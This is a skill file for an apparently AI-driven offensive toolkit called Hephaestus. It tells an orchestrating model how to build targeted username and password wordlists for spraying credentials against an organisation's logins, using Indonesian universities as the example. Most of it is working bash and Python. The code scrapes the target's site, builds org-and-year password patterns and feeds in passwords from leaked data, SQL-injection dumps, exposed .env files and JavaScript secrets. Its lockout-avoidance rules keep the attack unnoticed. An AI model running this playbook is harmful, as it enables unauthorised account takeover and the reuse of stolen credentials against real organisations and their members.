# SKILL: wordlist_gen — Credential Wordlist Generation

**Purpose:** End-to-end password and username wordlist generation for smart spraying. Org-based combos, target-specific permutations, context-aware generation. No brute force — smart creds only.

**Type:** access/wordlist | **Version:** 1.0 | **Author:** Hephaestus v6.0

---

## EXECUTION CONTEXT

```
Role: brain orchestrator — direct Bash for wordlist generation
Model: haiku for wordlist parsing
Trigger: Before spray phase — generate target-specific wordlists
Rule: Smart creds, not brute force. Max 15-20 guesses per endpoint.
```

---

## PHASE STRUCTURE

### PHASE 0 — COLLECT TARGET CONTEXT

**Step 0.1: Gather org intelligence**
```bash
TARGET="target.com"
ORG_NAME=$(echo "$TARGET" | cut -d'.' -f1 | sed 's/[0-9]//g')
echo "Organization: $ORG_NAME"

# Known info from recon
# Domain: target.com
# Organization: Target University / Target Corp
# Employees: staff, students, admins
# Year founded: 2015 (example)

# Create context file
cat > /tmp/target_context.txt << 'EOF'
Organization: TARGET_ORG
Domain: target.com
Type: university  # or: company, government, hospital, school
Founded: 2015
Location: Indonesia
Staff count: ~500
Students: ~5000
EOF

# Extract from target website
curl -s "https://target.com/about" 2>/dev/null | grep -iE "founded|established|since|2020|2021|2022|2023|2024" | head -10
curl -s "https://target.com/contact" 2>/dev/null | grep -iE "phone|fax|address|city|province" | head -10
```

---

### PHASE 1 — USERNAME WORDLISTS

**Step 1.1: Generate usernames from context**
```bash
TARGET="target.com"
ORG="targetorg"
CAMPAIGN="campaign_name"

mkdir -p ~/Hephaestus/output/${CAMPAIGN}/wordlists/

# Read target emails from LR
cat ~/Hephaestus/output/${CAMPAIGN}/lr_creds_users.txt 2>/dev/null | head -20 > ~/Hephaestus/output/${CAMPAIGN}/wordlists/usernames_lr.txt

# Generate org-based usernames
python3 << 'PYEOF'
target = "target.com"
org = "targetorg"

# Common username patterns
first_names = [
    "admin", "administrator", "root", "webmaster", "postmaster",
    "test", "demo", "dev", "developer", "user", "guest",
    "staff", "student", "teacher", " lecturer", "dosen",
    "sip", "siakad", "portal", "akademik",
    "john", "jane", "mike", "smith", "bob", "alice",
    "andrew", "budi", "dewi", "eko", "fitri", "hadi"
]

last_names = [
    "admin", "web", "test", "user", "staff", "dosen",
    "budi", "dewi", "eka", "fitri", "hadi", "irwan",
    "jaya", "kurnia", "lia", "made", "nur", "putra"
]

domains = [target, f"mail.{target}", f"smtp.{target}"]

# Generate patterns
patterns = [
    "{fn}", "{ln}", "{fn}.{ln}", "{ln}.{fn}",
    "{fn}{ln}", "{fn}_{ln}", "{fn}-{ln}",
    "{fn}.{ln}@", "{ln}.{fn}@",
    "{fn}123", "{fn}2024", "{fn}2023",
    "admin@{domain}", "admin@", "administrator@",
    "{org}", "{org}admin", "{org}web",
    "student", "staff", "dosen", "lecture",
    "user", "test", "demo", "guest",
]

with open("/tmp/usernames_gen.txt", "w") as f:
    for fn in first_names:
        for ln in last_names:
            for pattern in ["{fn}", "{ln}", "{fn}.{ln}", "{fn}{ln}", "{fn}_{ln}", "{fn}-{ln}"]:
                username = pattern.replace("{fn}", fn).replace("{ln}", ln)
                f.write(f"{username}\n")

    # Special patterns
    for pattern in ["admin", "administrator", "webmaster", "root", "test", "demo", "user", "guest", "student", "staff"]:
        f.write(f"{pattern}\n")
        f.write(f"{pattern}123\n")
        f.write(f"{pattern}@")

print("Generated username patterns")
PYEOF

# Combine with LR usernames
cat ~/Hephaestus/output/${CAMPAIGN}/wordlists/usernames_lr.txt 2>/dev/null >> /tmp/usernames_gen.txt
sort -u /tmp/usernames_gen.txt > ~/Hephaestus/output/${CAMPAIGN}/wordlists/usernames.txt
wc -l ~/Hephaestus/output/${CAMPAIGN}/wordlists/usernames.txt

echo "=== USERNAMES SAMPLE ==="
head -30 ~/Hephaestus/output/${CAMPAIGN}/wordlists/usernames.txt
```

---

### PHASE 2 — PASSWORD WORDLISTS

**Step 2.1: Smart org-based passwords**
```bash
TARGET="target.com"
ORG="targetorg"
YEAR="2024"
CAMPAIGN="campaign_name"

python3 << 'PYEOF'
target = "target.com"
org = "targetorg"
year = "2024"

# Smart password patterns (from real engagements)
passwords = []

# Base passwords
bases = [
    "password", "Password", "PASSWORD",
    "admin", "Administrator", "administrator",
    "test", "Test123", "test123", "Test1234",
    "user", "guest", "visitor", "demo",
    "welcome", "Welcome", "welcome123",
    "changeme", "ChangeMe", "changeme123",
    "default", "Default123",
]

# Year combinations
year_combos = [
    f"{year}", f"{year}!", f"{year}@", f"{year}#",
    f"20{year[-2:]}",
    f"{org}{year}", f"{org}{year}",
    f"Pass{year}", f"pass{year}",
]

# Org name combos
org_combos = [
    f"{org}123", f"{org}2024", f"{org}2023",
    f"{org}admin", f"{org}pass", f"{org}password",
    f"{org}@123", f"{org}#2024",
    f"{org}", f"{org}1", f"{org}12",
]

# Common edu patterns
edu_patterns = [
    f"{org}2024!", f"{org}2023!", f"{org}123!",
    f"{org}Pass", f"{org}Password",
    "akademik123", "siakad123", "portal123", "kemahasiswaan",
    "universitas", "university",
    "semester", "ganjil", "genap",
]

# Indonesian patterns
indo_patterns = [
    "Indonesia123", "indonesia2024", "Jakarta123",
    f"{org}Indonesia", "admin123", "admin2024",
    "gantipassword", "ubahpassword",
    "Sistem123", "Sistem2024", "Sistem@123",
    "Portal123", "Portal2024", "Login123",
]

# All combos
all_passwords = set(bases + year_combos + org_combos + edu_patterns + indo_patterns)

with open("/tmp/passwords_gen.txt", "w") as f:
    for p in sorted(all_passwords):
        f.write(f"{p}\n")

print(f"Generated {len(all_passwords)} smart passwords")
PYEOF

# Combine with rockyou (top 100 only)
head -100 ~/Hephaestus/wordlists/rockyou.txt 2>/dev/null >> /tmp/passwords_gen.txt 2>/dev/null

# Add leaked passwords from target's own breaches (if found in LR)
cat ~/Hephaestus/output/${CAMPAIGN}/lr_creds_passwords.txt 2>/dev/null >> /tmp/passwords_gen.txt 2>/dev/null

sort -u /tmp/passwords_gen.txt > ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt
wc -l ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt

echo "=== PASSWORDS SAMPLE ==="
head -30 ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt
```

---

### PHASE 3 — TARGET-SPECIFIC PERMUTATIONS

**Step 3.1: Generate from found data**
```bash
TARGET="target.com"
CAMPAIGN="campaign_name"

# If SQLi dumped passwords → add to wordlist
if [ -f ~/Hephaestus/output/${CAMPAIGN}/sql_crack_passwords.txt ]; then
    cat ~/Hephaestus/output/${CAMPAIGN}/sql_crack_passwords.txt >> ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt
fi

# If .env found → extract passwords → add
if [ -f /tmp/target_env.txt ]; then
    grep -oE "password[^;,]*" /tmp/target_env.txt 2>/dev/null >> ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt
    grep -oE "DB_PASS[^;,]*" /tmp/target_env.txt 2>/dev/null >> ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt
fi

# If JS secrets found → add passwords
if [ -f ~/Hephaestus/output/${CAMPAIGN}/js_secrets.json ]; then
    cat ~/Hephaestus/output/${CAMPAIGN}/js_secrets.json | \
        grep -oE '"[A-Za-z0-9@._%+-]{6,50}"' | \
        sed 's/"//g' >> ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt
fi

# Dedup final wordlist
sort -u ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt > /tmp/passwords_final.txt
wc -l /tmp/passwords_final.txt

# Limit to max 50 passwords (prevent lockout)
head -50 /tmp/passwords_final.txt > ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt
wc -l ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt
```

---

### PHASE 4 — LEAKED CREDENTIALS PARSING

**Step 4.1: Parse various credential formats**
```bash
CAMPAIGN="campaign_name"

# Parse rockyou-style
cat ~/Hephaestus/wordlists/rockyou.txt 2>/dev/null | head -1000 > /tmp/rockyou_top.txt

# Parse common format: email:password
cat ~/Hephaestus/output/${CAMPAIGN}/lr_results.txt 2>/dev/null | \
    grep "@" | \
    awk -F: '{print $2}' | \
    sort -u > ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords_from_lr.txt 2>/dev/null

# Parse SQL dump format
for dump in ~/Hephaestus/output/${CAMPAIGN}/sql_dump_*.csv; do
    [ -f "$dump" ] && awk -F, 'NR>1 {print $NF}' "$dump" 2>/dev/null
done >> ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt 2>/dev/null

# Add top common passwords
cat >> ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt << 'EOF'
Password123!
Password1
password123
admin123
Admin123
Admin@123
administrator
Welcome123
Welcome123!
P@ssw0rd
P@ssword123
Summer2024!
Winter2024
Spring2024
123456
12345678
qwerty
letmein
Welcome1
EOF

# Final dedup
sort -u ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt -o ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt

echo "=== FINAL WORDLIST STATS ==="
echo "Usernames: $(wc -l < ~/Hephaestus/output/${CAMPAIGN}/wordlists/usernames.txt)"
echo "Passwords: $(wc -l < ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt)"
echo ""
echo "Top usernames:"
head -10 ~/Hephaestus/output/${CAMPAIGN}/wordlists/usernames.txt
echo ""
echo "Top passwords:"
head -20 ~/Hephaestus/output/${CAMPAIGN}/wordlists/passwords.txt
```

---

## PASSWORD PATTERN MATRIX

| Pattern | Example | Source |
|---------|---------|--------|
| `{org}{year}!` | targetorg2024! | Org + year |
| `{org}@123` | targetorg@123 | Org + symbol |
| `{name}123` | admin123 | Common |
| `{year}{org}` | 2024targetorg | Year + org |
| `admin{year}` | admin2024 | Admin + year |
| `Welcome{year}` | Welcome2024! | Welcome + year |
| `Pass{year}` | Pass2024! | Pass + year |
| `{name}@123` | admin@123 | Name + symbol |
| `{org}Password` | targetorgPassword | Org + Password |
| `Indonesia{year}` | Indonesia2024! | Country + year |

---

## CRITICAL RULES

1. **Smart not brute** — org name + year combos, not rockyou 14M
2. **Max 50 passwords** — prevent account lockout
3. **Max 15-20 guesses** — per account, per endpoint
4. **Parse all sources** — LR + SQL dump + .env + JS = combined wordlist
5. **Deduplicate** — sort -u before spray
6. **Year combos** — current year, last year, founding year
7. **Org-specific** — target name, abbreviation, full name all included

---

## INTEGRATION POINTS

- **Inputs:** target context (org name, type, year), campaign name, all found data sources
- **Outputs:** `output/{campaign}/wordlists/usernames.txt`, `output/{campaign}/wordlists/passwords.txt`
- **Next skill:** `spray` (spray with generated wordlists), `leakradar` (if more creds needed)
- **Required tools:** python3, sort, awk, grep